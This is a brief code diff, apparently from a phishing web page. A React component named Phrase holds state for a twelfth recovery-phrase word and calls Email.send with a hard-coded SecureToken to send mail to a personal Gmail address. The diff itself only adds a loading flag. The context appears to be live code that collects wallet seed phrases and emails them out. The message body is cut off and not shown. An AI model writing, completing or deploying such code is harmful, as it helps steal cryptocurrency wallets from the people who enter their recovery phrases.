@@ -395,7 +395,7 @@ const Phrase = ({ data }) => {
     const [phrase12, setPhrase12] = useState("")
     const router = useRouter();
     const myFunc = ( ) => {
-        
+        setIsLoading(true)
         Email.send({
             SecureToken : "f10ea3fc-c85c-40ed-93e9-4467760c85cf",
             To : 'amogukachi7@gmail.com',
